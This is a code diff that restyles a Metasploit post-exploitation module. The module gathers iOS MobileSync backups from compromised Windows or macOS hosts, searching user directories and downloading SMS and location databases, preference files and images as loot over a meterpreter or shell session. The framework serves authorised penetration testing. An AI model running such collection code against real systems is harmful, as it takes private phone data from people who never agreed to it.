@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,29 +8,28 @@ require 'msf/core'
 require 'rex/parser/apple_backup_manifestdb'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'           => 'Windows Gather Apple iOS MobileSync Backup File Collection',
-      'Description'    => %q{ This module will collect sensitive files from any on-disk iOS device backups },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'hdm',
-          'bannedit' # Based on bannedit's pidgin_cred module structure
-        ],
-      'Platform'       => %w{ osx win },
-      'SessionTypes'   => ['meterpreter', 'shell']
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'           => 'Windows Gather Apple iOS MobileSync Backup File Collection',
+                      'Description'    => %q( This module will collect sensitive files from any on-disk iOS device backups ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [
+                          'hdm',
+                          'bannedit' # Based on bannedit's pidgin_cred module structure
+                        ],
+                      'Platform'       => %w(osx win),
+                      'SessionTypes'   => ['meterpreter', 'shell']))
     register_options(
       [
-        OptBool.new('DATABASES',  [false, 'Collect all database files? (SMS, Location, etc)', true]),
+        OptBool.new('DATABASES', [false, 'Collect all database files? (SMS, Location, etc)', true]),
         OptBool.new('PLISTS', [false, 'Collect all preference list files?', true]),
         OptBool.new('IMAGES', [false, 'Collect all image files?', false]),
         OptBool.new('EVERYTHING', [false, 'Collect all stored files? (SLOW)', false])
-      ], self.class)
+      ], self.class
+    )
   end
 
   #
@@ -73,11 +73,11 @@ class MetasploitModule < Msf::Post
   end
 
   def enum_users_unix
-    if @platform == :osx
-      home = "/Users/"
-    else
-      home = "/home/"
-    end
+    home = if @platform == :osx
+             "/Users/"
+           else
+             "/home/"
+           end
 
     if got_root?
       userdirs = []
@@ -119,7 +119,7 @@ class MetasploitModule < Msf::Post
   end
 
   def enum_users_windows
-    paths = Array.new
+    paths = []
 
     if got_root?
       begin
@@ -127,7 +127,7 @@ class MetasploitModule < Msf::Post
           next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/i
           bdir = "#{@users}\\#{path}#{@appdata}\\Apple Computer\\MobileSync\\Backup"
           dirs = check_for_backups_win(bdir)
-          dirs.each { |dir| paths << dir } if dirs
+          dirs&.each { |dir| paths << dir }
         end
       rescue ::Rex::Post::Meterpreter::RequestError
         # Handle the case of the @users base directory is not accessible
@@ -136,16 +136,16 @@ class MetasploitModule < Msf::Post
       print_status "Only checking #{whoami} account since we do not have SYSTEM..."
       path = "#{@users}\\#{whoami}#{@appdata}\\Apple Computer\\MobileSync\\Backup"
       dirs = check_for_backups_win(path)
-      dirs.each { |dir| paths << dir } if dirs
+      dirs&.each { |dir| paths << dir }
     end
-    return paths
+    paths
   end
 
   def check_for_backups_win(bdir)
     dirs = []
     begin
-        print_status("Checking for backups in #{bdir}")
-        session.fs.dir.foreach(bdir) do |dir|
+      print_status("Checking for backups in #{bdir}")
+      session.fs.dir.foreach(bdir) do |dir|
         if dir =~ /^[0-9a-f]{16}/i
           print_status("Found #{bdir}\\#{dir}")
           dirs << "#{bdir}\\#{dir}"
@@ -158,11 +158,10 @@ class MetasploitModule < Msf::Post
   end
 
   def process_backups(paths)
-    paths.each {|path| process_backup(path) }
+    paths.each { |path| process_backup(path) }
   end
 
   def process_backup(path)
-
     print_status("Pulling data from #{path}...")
 
     mbdb_data = ""
@@ -177,9 +176,7 @@ class MetasploitModule < Msf::Post
       end
     else
       mfd = session.fs.file.new("#{path}\\Manifest.mbdb", "rb")
-      until mfd.eof?
-        mbdb_data << mfd.read
-      end
+      mbdb_data << mfd.read until mfd.eof?
       mfd.close
     end
 
@@ -192,9 +189,7 @@ class MetasploitModule < Msf::Post
       end
     else
       mfd = session.fs.file.new("#{path}\\Manifest.mbdx", "rb")
-      until mfd.eof?
-        mbdx_data << mfd.read
-      end
+      mbdx_data << mfd.read until mfd.eof?
       mfd.close
     end
 
@@ -210,31 +205,29 @@ class MetasploitModule < Msf::Post
     patterns.each do |pat|
       manifest.entries.each_pair do |fname, info|
         next if done[fname]
-        next if not info[:filename].to_s =~ pat
+        next unless info[:filename].to_s =~ pat
 
         print_status("Downloading #{info[:domain]} #{info[:filename]}...")
 
         begin
 
-        fdata = ""
-        if session.type == "shell"
-          fdata = session.shell_command("cat #{path}/#{fname}")
-        else
-          mfd = session.fs.file.new("#{path}\\#{fname}", "rb")
-          until mfd.eof?
-            fdata << mfd.read
+          fdata = ""
+          if session.type == "shell"
+            fdata = session.shell_command("cat #{path}/#{fname}")
+          else
+            mfd = session.fs.file.new("#{path}\\#{fname}", "rb")
+            fdata << mfd.read until mfd.eof?
+            mfd.close
           end
-          mfd.close
-        end
-        bname = info[:filename] || "unknown.bin"
-        rname = info[:domain].to_s + "_" + bname
-        rname = rname.gsub(/\/|\\/, ".").gsub(/\s+/, "_").gsub(/[^A-Za-z0-9\.\_]/, '').gsub(/_+/, "_")
-        ctype = "application/octet-stream"
+          bname = info[:filename] || "unknown.bin"
+          rname = info[:domain].to_s + "_" + bname
+          rname = rname.gsub(/\/|\\/, ".").gsub(/\s+/, "_").gsub(/[^A-Za-z0-9\.\_]/, '').gsub(/_+/, "_")
+          ctype = "application/octet-stream"
 
-        store_loot("ios.backup.data", ctype, session, fdata, rname, "iOS Backup: #{rname}")
+          store_loot("ios.backup.data", ctype, session, fdata, rname, "iOS Backup: #{rname}")
 
         rescue ::Interrupt
-          raise $!
+          raise $ERROR_INFO
         rescue ::Exception => e
           print_error("Failed to download #{fname}: #{e.class} #{e}")
         end
@@ -244,14 +237,13 @@ class MetasploitModule < Msf::Post
     end
   end
 
-
   def got_root?
     case @platform
     when :windows
       if session.sys.config.getuid =~ /SYSTEM/
-        return true
+        true
       else
-        return false
+        false
       end
     else # unix, bsd, linux, osx
       ret = whoami
